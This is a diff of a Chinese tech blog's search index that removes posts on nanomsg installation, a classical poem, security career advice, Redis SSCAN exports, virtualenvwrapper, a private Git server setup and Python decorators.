@@ -1,693 +1,267 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
-  
-  
-    
-    <entry>
-      <title><![CDATA[CentOS下安装nanomsg和nnpy]]></title>
-      <url>http://sha256.cc/2017/09/09/linux-python-nanomsg/</url>
-      <content type="html"><![CDATA[<p><a href="http://nanomsg.org/" target="_blank" rel="external">nanomsg</a>是ZeroMQ作者用C语言重写的一个Socket库，其用法和模式和ZeroMQ差不多，但是具有<a href="http://nanomsg.org/documentation-zeromq.html" target="_blank" rel="external">更好的性能和更完善的接口</a>。<a id="more"></a></p>
-<p>下面我们介绍一下CentOS7下nanomsg的安装，以及Python如何调用。</p>
-<h1 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/nanomsg/nanomsg/archive/1.0.0.tar.gz -O nanomsg-1.0.0.tar.gz</span><br></pre></td></tr></table></figure>
-<h1 id="准备编译环境"><a href="#准备编译环境" class="headerlink" title="准备编译环境"></a>准备编译环境</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install gcc gcc-c++ python-devel cmake</span><br></pre></td></tr></table></figure>
-<p>nanomsg要求cmake版本要<a href="http://cmake.org" target="_blank" rel="external">CMake</a>2.8.7以上，如果yum源版本不够，需要手动安装</p>
-<h1 id="编译安装nanomsg"><a href="#编译安装nanomsg" class="headerlink" title="编译安装nanomsg"></a>编译安装nanomsg</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf nanomsg-1.0.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> nanomsg-1.0.0</span><br><span class="line">mkdir bulid</span><br><span class="line"><span class="comment"># 这一步如果出现问题，需要删除CMakeCache.txt重新cmake</span></span><br><span class="line">cmake ..</span><br><span class="line">cmake --build .</span><br><span class="line"><span class="comment"># 执行测试</span></span><br><span class="line">ctest -C Debug .</span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">cmake --build . --target install</span><br><span class="line"><span class="comment"># 把libnanomsg.so所在路径写入共享库目录（以/usr/local/lib64为例）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/usr/local/lib64"</span> &gt;&gt; /etc/ld.so.conf</span><br><span class="line"><span class="comment"># 加载共享库</span></span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure>
-<h1 id="安装Python调用模块"><a href="#安装Python调用模块" class="headerlink" title="安装Python调用模块"></a>安装Python调用模块</h1><p>这里有两个选择:<a href="https://github.com/tonysimpson/nanomsg-python" target="_blank" rel="external">nanomsg-python</a> 和 <a href="https://github.com/nanomsg/nnpy" target="_blank" rel="external">nnpy</a>。<br>其中nanomsg-python很久没人维护，而nnpy较新且已经合并到nanomsg的官方代码库中，推荐使用nnpy。<br>nnpy是基于cffi的，所以需要安装cffi相关开发库，然后pip安装即可：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install libffi-devel</span><br><span class="line">pip install nnpy</span><br></pre></td></tr></table></figure>
-<p>nnpy代码示例：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nnpy</span><br><span class="line"></span><br><span class="line">pub = nnpy.Socket(nnpy.AF_SP, nnpy.PUB)</span><br><span class="line">pub.bind(<span class="string">'inproc://foo'</span>)</span><br><span class="line"></span><br><span class="line">sub = nnpy.Socket(nnpy.AF_SP, nnpy.SUB)</span><br><span class="line">sub.connect(<span class="string">'inproc://foo'</span>)</span><br><span class="line">sub.setsockopt(nnpy.SUB, nnpy.SUB_SUBSCRIBE, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">pub.send(<span class="string">'hello, world'</span>)</span><br><span class="line">print(sub.recv())</span><br></pre></td></tr></table></figure>
-<p>如果运行没有报错，那么就大功告成了。</p>
-<h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><ol>
-<li>nnpy要求python版本2.7+/3.4+, 而nanomsg-python支持CPython 2.6+, 3.2+ and Pypy 2.1.0+。</li>
-<li>如果一定要使用nanomsg-python，使用pip安装可能会收到告警：<code>&quot;Could not load the default wrapper for your platform: XX, performance may be affected!&quot;</code>。把源码拷贝下来使用<code>python setup.py install</code>安装可以解决这个问题。</li>
-</ol>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[虞美人· 听雨]]></title>
-      <url>http://sha256.cc/2017/07/21/yumeiren/</url>
-      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p> 宋·蒋捷</p>
-<h4 id="少年听雨歌楼上，红烛昏罗帐。壮年听雨客舟中，江阔云低，断雁叫西风。"><a href="#少年听雨歌楼上，红烛昏罗帐。壮年听雨客舟中，江阔云低，断雁叫西风。" class="headerlink" title="少年听雨歌楼上，红烛昏罗帐。壮年听雨客舟中，江阔云低，断雁叫西风。"></a>少年听雨歌楼上，红烛昏罗帐。壮年听雨客舟中，江阔云低，断雁叫西风。</h4><h4 id="而今听雨僧庐下，鬓已星星也。悲欢离合总无凭，一任阶前点滴到天明。"><a href="#而今听雨僧庐下，鬓已星星也。悲欢离合总无凭，一任阶前点滴到天明。" class="headerlink" title="而今听雨僧庐下，鬓已星星也。悲欢离合总无凭，一任阶前点滴到天明。"></a>而今听雨僧庐下，鬓已星星也。悲欢离合总无凭，一任阶前点滴到天明。</h4></blockquote> <a id="more"></a>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[TK对安全从业者的成长建议]]></title>
-      <url>http://sha256.cc/2017/06/30/security-personal-development/</url>
-      <content type="html"><![CDATA[<blockquote>
-<p>今天看到一条TK的微博，分享了腾讯玄武实验室内部例会的一则PPT，讲的是个人成长。觉得讲得很好，在这里总结一下。</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="个人成长"><a href="#个人成长" class="headerlink" title="个人成长"></a>个人成长</h2><p>确立个人方向，结合工作内容，找出对应短板</p>
-<ul>
-<li>该领域主要专家们的工作是否都了解？</li>
-<li>相关网络协议、文件格式是否都熟悉？</li>
-<li>相关的技术和主要工具是否看过、用过？</li>
-</ul>
-<p>阅读只是学习过程的起点，不能止于阅读</p>
-<ul>
-<li>工具的每个参数每个菜单都要看、要试</li>
-<li>学习网络协议要实际抓包分析、学习文件格式要读代码实现</li>
-<li>学习老漏洞一定要调试，搞懂别人代码每一个字节的意义，之后一定要完全自己重写一个Exploit</li>
-<li>细节、细节、细节，刨根问底</li>
-</ul>
-<h2 id="建立学习参考目标"><a href="#建立学习参考目标" class="headerlink" title="建立学习参考目标"></a>建立学习参考目标</h2><p>短期参考：比自己优秀的同龄人</p>
-<ul>
-<li>阅读他们的文章和其他工作成果，从细节中观察他们的学习方式和工作方式</li>
-</ul>
-<p>中期参考：相同方向上的业内专家</p>
-<ul>
-<li>了解他们的成长轨迹，跟踪他们关注的内容</li>
-</ul>
-<p>长期参考：业内老牌企业和先锋企业</p>
-<ul>
-<li>把握行业发展、技术趋势，为未来做积累</li>
-</ul>
-<h2 id="推荐的学习方式"><a href="#推荐的学习方式" class="headerlink" title="推荐的学习方式"></a>推荐的学习方式</h2><p>以工具为线索</p>
-<ul>
-<li>Kali Linux</li>
-<li>以Metasploit为例：<ul>
-<li>遍历每个子目录，除了Exploit里面还有什么？</li>
-<li>每个工具分别有什么功能？原理是什么？涉及哪些知识？</li>
-<li>能否改进优化？能否发展、组合出新的功能？</li>
-</ul>
-</li>
-</ul>
-<p>以专家为线索</p>
-<ul>
-<li>你的技术方向里有哪些专家？</li>
-<li>他们的邮箱、主页、社交网络账号是什么？</li>
-<li>他们在该方向上有哪些作品？发表过哪些演讲？</li>
-</ul>
-<h2 id="处理好学习、工作和生活"><a href="#处理好学习、工作和生活" class="headerlink" title="处理好学习、工作和生活"></a>处理好学习、工作和生活</h2><p>学习、工作和生活是矛盾统一的</p>
-<p>三者都需要时间，你一天只有24个小时</p>
-<ul>
-<li>调和矛盾的关键：提高效率</li>
-</ul>
-<p>对于一个没有好爸爸的人来说，学习、工作决定你能不能追求远方</p>
-<h2 id="如何提高效率"><a href="#如何提高效率" class="headerlink" title="如何提高效率"></a>如何提高效率</h2><p>做好预研，收集相关前人成果，避免无谓的重复劳动</p>
-<p>在可行性判断阶段，能找到工具就不写代码，能用脚本语言写就不用编译语言，把完美主义放在最终实现阶段</p>
-<p>做好笔记并定期整理，遗忘会让所有的投入都白白浪费</p>
-<p>多和同事交流，别人说一个工具的名字可能让你节约数小时</p>
-<p>咖啡可以提高思维效率，而且合法（？）</p>
-<p><strong>无论怎么提高效率，要成为专家，都需要大量的时间投入</strong></p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[安全快速地导出Redis集合大数据]]></title>
-      <url>http://sha256.cc/2017/04/05/dump-huge-redis-data/</url>
-      <content type="html"><![CDATA[<p>最近利用redis的集合做数据去重，共存储3e条记录到一个键。<br>现在需要把这3e数据导出到文本文件里面来。<br><a id="more"></a><br>首先我们不能用<code>smembers</code>方法，这个方法会阻塞Redis进程，由于数据量太多，可能会阻塞几十秒，排除这个方法。</p>
-<p>然后我们想到mysql导出大数据的时候会利用cursor来迭代处理，查阅redis文档，我们发现有类似的方法<code>sscan</code>, 可以一次取出指定数量的数据，并且迭代集合。这样不会阻塞redis服务，而且速度很快（40min处理了3e条数据）。</p>
-<blockquote>
-<p>SCAN cursor [MATCH pattern] [COUNT count]</p>
-<p>Available since 2.8.0.<br>Time complexity: O(1) for every call. O(N) for a complete iteration, including enough command calls for the cursor to return back to 0. N is the number of elements inside the collection.</p>
-</blockquote>
-<p>代码片段如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(to, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        cursor = <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">while</span> cursor != <span class="number">0</span>:</span><br><span class="line">            cursor, data = r.sscan(key, cursor=cursor, count=count)</span><br><span class="line">            data = [<span class="string">'&#123;0&#125;\n'</span>.format(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">            <span class="comment"># 批量写入减少IO操作</span></span><br><span class="line">            f.writelines(data)</span><br><span class="line">            print(<span class="string">'cursor:&#123;0&#125;'</span>.format(cursor))</span><br></pre></td></tr></table></figure>
-<p>迭代开始的时候我们用0初始化cursor的值，每次迭代的时候都传入上一轮返回cursor值，直到cursor再次等于0的时候遍历结束。</p>
-<p><code>sscan</code>方法有几个特别的地方：</p>
-<ol>
-<li><p>返回的cursor值并不是递增的，而且随机变化的，也就是说你不能通过cursor判断当前集合遍历的进度。<br> <img src="/images/redis_sscan_cursor.png" alt="redis_sscan_cursor"></p>
-</li>
-<li><p>某些元素可能会被返回<strong>多次</strong>。</p>
-<blockquote>
-<p>A given element may be returned multiple times. It is up to the application to handle the case of duplicated elements, for example only using the returned elements in order to perform operations that are safe when re-applied multiple times.</p>
-</blockquote>
-</li>
-<li><p>当集合在迭代的时候发生变化，某些元素可能不会被返回。</p>
-<blockquote>
-<p>Elements that were not constantly present in the collection during a full iteration, may be returned or not: it is undefined.</p>
-</blockquote>
-</li>
-<li><p>迭代返回元素的数量可能和count指定的不一致</p>
-<blockquote>
-<p>While SCAN does not provide guarantees about the number of elements returned at every iteration, it is possible to empirically adjust the behavior of SCAN using the COUNT option. Basically with COUNT the user specified the amount of work that should be done at every call in order to retrieve elements from the collection. This is just an hint for the implementation, however generally speaking this is what you could expect most of the times from the implementation.<br> The default COUNT value is 10.<br> When iterating the key space, or a Set, Hash or Sorted Set that is big enough to be represented by a hash table, assuming no MATCH option is used, the server will usually return count or a bit more than count elements per call.<br> When iterating Sets encoded as intsets (small sets composed of just integers), or Hashes and Sorted Sets encoded as ziplists (small hashes and sets composed of small individual values), usually all the elements are returned in the first SCAN call regardless of the COUNT value.<br> Important: there is no need to use the same COUNT value for every iteration. The caller is free to change the count from one iteration to the other as required, as long as the cursor passed in the next call is the one obtained in the previous call to the command.</p>
-</blockquote>
-</li>
-</ol>
-<p>因此不建议在集合可能会发生变动的情况下使用这个方法。</p>
-<p>参考链接：</p>
-<ol>
-<li><a href="https://redis.io/commands/scan" target="_blank" rel="external">redis官方文档</a></li>
-<li><a href="https://zhuoroger.github.io/2016/08/13/redis-delete-large-keys/" target="_blank" rel="external">如何优雅地删除Redis大键</a></li>
-</ol>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[使用virtualenvwrapper(Linux + Windows)]]></title>
-      <url>http://sha256.cc/2017/01/10/use-virtualenvwrapper/</url>
-      <content type="html"><![CDATA[<p>生活的问题在于，你永远不知道下一个到来的是什么问题。开发亦然。之前Python都是用一个运行环境，偶尔用一下virtualenv，直到开始在windows调试python才不得不来学习virtualenvwrapper。<a id="more"></a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Virtualenvwrapper解决的主要问题是和virtualenv一样的，但是它弥补了virtualenv无法统一管理环境的缺点。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>virtualenvwrapper安装方式还是比较简单的。</p>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>1.安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install virtualenvwrapper</span><br></pre></td></tr></table></figure></p>
-<p>2.设置环境变量<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export WORKON_HOME=~/Envs</span><br><span class="line">export PROJECT_HOME=$HOME/pyproj</span><br><span class="line">source /usr/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure></p>
-<p>建议添加到自启动脚本中<code>~/.bashrc</code> 或 <code>~/.profile</code>。</p>
-<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>windows下直接安装virtualenvwrapper似乎不能运行。<br>我搜索到有独立的安装包，也能通过pip安装。<a href="https://github.com/davidmarble/virtualenvwrapper-win。" target="_blank" rel="external">https://github.com/davidmarble/virtualenvwrapper-win。</a></p>
-<p>1.安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># using pip</span><br><span class="line">pip install virtualenvwrapper-win</span><br><span class="line"></span><br><span class="line"># using easy_install</span><br><span class="line">easy_install virtualenvwrapper-win</span><br><span class="line"></span><br><span class="line"># from source</span><br><span class="line">git clone git://github.com/davidmarble/virtualenvwrapper-win.git</span><br><span class="line">cd virtualenvwrapper-win</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></p>
-<p>2.设置环境变量（可选）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Optional: Add an environment variable WORKON_HOME to specify the path to store environments. By default, this is `%USERPROFILE%\Envs`。</span><br></pre></td></tr></table></figure></p>
-<p>3.可能出现的错误<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  File &quot;D:\Python\Python27\Lib\mimetypes.py&quot;, line 249, in enum_types</span><br><span class="line">        ctype = ctype.encode(default_encoding) # omit in 3.x!</span><br><span class="line">UnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xb0 in position 1: ordinal not in range(128)</span><br></pre></td></tr></table></figure></p>
-<p>原因是某些程序（阿里旺旺）写了一些中文键值到注册表里。具体看<a href="http://pcliuyang.blog.51cto.com/8343567/1339637" target="_blank" rel="external">http://pcliuyang.blog.51cto.com/8343567/1339637</a></p>
-<p><strong>解决方法</strong>：打开<code>Python27/Lib/mimetypes.py</code>，找到<code>default_encoding = sys.getdefaultencoding()</code>一行，在它前面添加如下代码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># begin fix bug</span><br><span class="line">if sys.getdefaultencoding() != &apos;gbk&apos;:</span><br><span class="line">        reload(sys)</span><br><span class="line">        sys.setdefaultencoding(&apos;gbk&apos;)</span><br><span class="line"># end</span><br></pre></td></tr></table></figure></p>
-<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>主要命令Linux和windows是一致的，部分有出入。</p>
-<h3 id="主要命令"><a href="#主要命令" class="headerlink" title="主要命令"></a>主要命令</h3><p><code>mkvirtualenv &lt;name&gt;</code><br>    Create a new virtualenv environment named <em><name></name></em>.  The environment will<br>    be created in WORKON_HOME.</p>
-<p><code>lsvirtualenv</code><br>    List all of the enviornments stored in WORKON_HOME.</p>
-<p><code>rmvirtualenv &lt;name&gt;</code><br>    Remove the environment <em><name></name></em>. Uses <code>folder_delete.bat</code>.</p>
-<p><code>workon [&lt;name&gt;]</code><br>    If <em><name></name></em> is specified, activate the environment named <em><name></name></em> (change<br>    the working virtualenv to <em><name></name></em>). If a project directory has been<br>    defined, we will change into it. If no argument is specified, list the<br>    available environments. One can pass additional option -c after<br>    virtualenv name to cd to virtualenv directory if no projectdir is set.</p>
-<p><code>deactivate</code><br>    Deactivate the working virtualenv and switch back to the default system<br>    Python.</p>
-<p><code>add2virtualenv &lt;full or relative path&gt;</code><br>    If a virtualenv environment is active, appends <em><path></path></em> to<br>    <code>virtualenv_path_extensions.pth</code> inside the environment’s site-packages,<br>    which effectively adds <em><path></path></em> to the environment’s PYTHONPATH.<br>    If a virtualenv environment is not active, appends <em><path></path></em> to<br>    <code>virtualenv_path_extensions.pth</code> inside the default Python’s<br>    site-packages. If <em><path></path></em> doesn’t exist, it will be created.</p>
-<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p><code>cdproject</code><br>    If a virtualenv environment is active and a projectdir has been defined,<br>    change the current working directory to active virtualenv’s project directory.<br>    <code>cd-</code> will return you to the last directory you were in before calling<br>    <code>cdproject</code>.</p>
-<p><code>cdsitepackages</code><br>    If a virtualenv environment is active, change the current working<br>    directory to the active virtualenv’s site-packages directory. If<br>    a virtualenv environment is not active, change the current working<br>    directory to the default Python’s site-packages directory. <code>cd-</code><br>    will return you to the last directory you were in before calling<br>    <code>cdsitepackages</code>.</p>
-<p><code>cdvirtualenv</code><br>    If a virtualenv environment is active, change the current working<br>    directory to the active virtualenv base directory. If a virtualenv<br>    environment is not active, change the current working directory to<br>    the base directory of the default Python. <code>cd-</code> will return you<br>    to the last directory you were in before calling <code>cdvirtualenv</code>.</p>
-<p><code>lssitepackages</code><br>    If a virtualenv environment is active, list that environment’s<br>    site-packages. If a virtualenv environment is not active, list the<br>    default Python’s site-packages. Output includes a basic listing of<br>    the site-packages directory, the contents of easy-install.pth,<br>    and the contents of virtualenv_path_extensions.pth (used by<br>    <code>add2virtualenv</code>).</p>
-<p><code>setprojectdir(win)/setvirtualenvproject(Linux)</code><br>    这两个命令功能相同，但是格式不同。<code>setprojectdir</code>只需要一个参数，指定工程主目录。<code>setvirtualenvproject</code>需要两个参数，参数一指定虚拟环境目录，参数二指定工程主目录。参数可省略，省略时使用当前的虚拟环境和当前目录。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># setvirtualenvproject 用法示例</span></span><br><span class="line">$ mkproject myproj</span><br><span class="line">New python executable <span class="keyword">in</span> myproj/bin/python</span><br><span class="line">Installing setuptools.............................................</span><br><span class="line">..................................................................</span><br><span class="line">..................................................................</span><br><span class="line">done.</span><br><span class="line">Creating /Users/dhellmann/Devel/myproj</span><br><span class="line">(myproj)$ mkvirtualenv myproj_new_libs</span><br><span class="line">New python executable <span class="keyword">in</span> myproj/bin/python</span><br><span class="line">Installing setuptools.............................................</span><br><span class="line">..................................................................</span><br><span class="line">..................................................................</span><br><span class="line">done.</span><br><span class="line">Creating /Users/dhellmann/Devel/myproj</span><br><span class="line">(myproj_new_libs)$ setvirtualenvproject <span class="variable">$VIRTUAL_ENV</span> $(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>
-<p><code>toggleglobalsitepackages</code><br>    If a virtualenv environment is active, toggle between having the<br>    global site-packages in the PYTHONPATH or just the virtualenv’s<br>    site-packages.</p>
-<p><code>whereis &lt;file&gt;</code><br>    A script included for convenience. Returns directory locations<br>    of <code>file</code> and <code>file</code> with any executable extensions. So you can call<br>    <code>whereis python</code> to find all executables starting with <code>python</code> or<br>    <code>whereis python.exe</code> for an exact match.</p>
-<p><code>mkproject(Only in Linux)</code><br>    项目将创建到PROJECT_HOME目录下，实际上相当于在某个目录下，建了一个环境。</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[搭建使用个人Git服务器]]></title>
-      <url>http://sha256.cc/2016/12/16/private-git/</url>
-      <content type="html"><![CDATA[<p>一直一来都不用IDE，直接用SFTPDriver把Linux服务器文件直接映射到Windows本次操作。可惜Win10已经用不了SftpDriver，替代品稳定性捉急，因此在Linux上搭建个人Git服务器成为了必然。<a id="more"></a></p>
-<h2 id="Git服务器搭建"><a href="#Git服务器搭建" class="headerlink" title="Git服务器搭建"></a>Git服务器搭建</h2><p>以CentOS7为例，有以下几个步骤。</p>
-<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install git</span><br></pre></td></tr></table></figure>
-<h3 id="创建git用户，创建authorized-keys文件"><a href="#创建git用户，创建authorized-keys文件" class="headerlink" title="创建git用户，创建authorized_keys文件"></a>创建git用户，创建authorized_keys文件</h3><p>一定要设置好权限，否则无法起作用或者不安全<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduser git </span><br><span class="line">su - git</span><br><span class="line">mkdir .ssh &amp;&amp; chmod 700 .ssh</span><br><span class="line">touch .ssh/authorized_keys</span><br><span class="line">chmod 600 .ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>
-<h3 id="创建一个空仓库"><a href="#创建一个空仓库" class="headerlink" title="创建一个空仓库"></a>创建一个空仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /home/git</span><br><span class="line">git init --bare sample.git</span><br></pre></td></tr></table></figure>
-<h3 id="禁止git用户登录服务器"><a href="#禁止git用户登录服务器" class="headerlink" title="禁止git用户登录服务器"></a>禁止git用户登录服务器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改 /bin/bash 为 git-shell</span></span><br><span class="line">vim /etc/passwd</span><br><span class="line">git:x:1001:1002::/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure>
-<h3 id="退出git用户"><a href="#退出git用户" class="headerlink" title="退出git用户"></a>退出git用户</h3><h2 id="TortoiseGit客户端使用"><a href="#TortoiseGit客户端使用" class="headerlink" title="TortoiseGit客户端使用"></a>TortoiseGit客户端使用</h2><h3 id="使用Puttygen生成密钥对"><a href="#使用Puttygen生成密钥对" class="headerlink" title="使用Puttygen生成密钥对"></a>使用Puttygen生成密钥对</h3><p><img src="/images/private-git-1.png" alt="select-tag"><br>公钥复制粘贴到服务器的<code>/home/git/.ssh/authorized_keys</code>文件中。<br>私钥保存在本地。</p>
-<blockquote>
-<p>TortoiseGit默认不是OpenSSH</p>
-</blockquote>
-<h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><p>右键 git clone，加载Putty密钥选择刚刚生成的私钥。<br><img src="/images/private-git-2.png" alt="select-tag"></p>
-<h2 id="错误帮助"><a href="#错误帮助" class="headerlink" title="错误帮助"></a>错误帮助</h2><h3 id="如果提示网络无法链接，那么服务器的ssh端口很可能不是22！"><a href="#如果提示网络无法链接，那么服务器的ssh端口很可能不是22！" class="headerlink" title="如果提示网络无法链接，那么服务器的ssh端口很可能不是22！"></a>如果提示网络无法链接，那么服务器的ssh端口很可能不是22！</h3><p>如果服务器ssh端口不是22，则要求如下格式：</p>
-<blockquote>
-<p>ssh://git@115.28.137.182:23456/home/git/sample.git</p>
-</blockquote>
-<ul>
-<li><code>ssh://</code> 前缀必不可少</li>
-<li>ip和端口之间一个冒号，端口和项目地址没有冒号！</li>
-</ul>
-<h3 id="如果要求你输入git的密码，那么很有可能authorized-keys有问题"><a href="#如果要求你输入git的密码，那么很有可能authorized-keys有问题" class="headerlink" title="如果要求你输入git的密码，那么很有可能authorized_keys有问题"></a>如果要求你输入git的密码，那么很有可能authorized_keys有问题</h3><ul>
-<li>格式错误</li>
-<li>权限不对</li>
-</ul>
-<p>具体可以在 <strong>systemctl status sshd</strong> 里看到错误日志！</p>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[【转】Python装饰器]]></title>
-      <url>http://sha256.cc/2016/12/05/python-decorator/</url>
-      <content type="html"><![CDATA[<p>装饰器本质上是一个Python函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。<a id="more"></a>它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。</p>
-<p>先来看一个简单例子：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'i am foo'</span>)</span><br><span class="line">现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'i am foo'</span>)</span><br><span class="line">    logging.info(<span class="string">"foo is running"</span>)</span><br></pre></td></tr></table></figure>
-<p>bar()、bar2()也有类似的需求，怎么做？再写一个logging在bar函数里？这样就造成大量雷同的代码，为了减少重复写代码，我们可以这样做，重新定义一个函数：专门处理日志 ，日志处理完之后再执行真正的业务代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span><span class="params">(func)</span>:</span></span><br><span class="line">    logging.warn(<span class="string">"%s is running"</span> % func.__name__)</span><br><span class="line">    func()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'i am bar'</span>)</span><br><span class="line"></span><br><span class="line">use_logging(bar)</span><br></pre></td></tr></table></figure>
-<p>逻辑上不难理解， 但是这样的话，我们每次都要将一个函数作为参数传递给use_logging函数。而且这种方式已经破坏了原有的代码逻辑结构，之前执行业务逻辑时，执行运行bar()，但是现在不得不改成use_logging(bar)。那么有没有更好的方式的呢？当然有，答案就是装饰器。</p>
-<h3 id="简单装饰器"><a href="#简单装饰器" class="headerlink" title="简单装饰器"></a>简单装饰器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span><span class="params">(func)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        logging.warn(<span class="string">"%s is running"</span> % func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'i am bar'</span>)</span><br><span class="line"></span><br><span class="line">bar = use_logging(bar)</span><br><span class="line">bar()</span><br></pre></td></tr></table></figure>
-<p>函数use_logging就是装饰器，它把执行真正业务方法的func包裹在函数里面，看起来像bar被use_logging装饰了。在这个例子中，函数进入和退出时，被称为一个横切面(Aspect)，这种编程方式被称为面向切面的编程(Aspect-Oriented Programming)。@符号是装饰器的语法糖，在定义函数的时候使用，避免再一次赋值操作。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span><span class="params">(func)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        logging.warn(<span class="string">"%s is running"</span> % func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"i am foo"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"i am bar"</span>)</span><br><span class="line"></span><br><span class="line">bar()</span><br></pre></td></tr></table></figure>
-<p>如上所示，这样我们就可以省去<code>bar = use_logging(bar)</code>这一句了，直接调用bar()即可得到想要的结果。如果我们有其他的类似函数，我们可以继续调用装饰器来修饰函数，而不用重复修改函数或者增加新的封装。这样，我们就提高了程序的可重复利用性，并增加了程序的可读性。</p>
-<p>装饰器在Python使用如此方便都要归因于Python的函数能像普通的对象一样能作为参数传递给其他函数，可以被赋值给其他变量，可以作为返回值，可以被定义在另外一个函数内。</p>
-<h3 id="带参数的装饰器"><a href="#带参数的装饰器" class="headerlink" title="带参数的装饰器"></a>带参数的装饰器</h3><p>装饰器还有更大的灵活性，例如带参数的装饰器：在上面的装饰器调用中，比如@use_logging，该装饰器唯一的参数就是执行业务的函数。装饰器的语法允许我们在调用时，提供其它参数，比如@decorator(a)。这样，就为装饰器的编写和使用提供了更大的灵活性。</p>
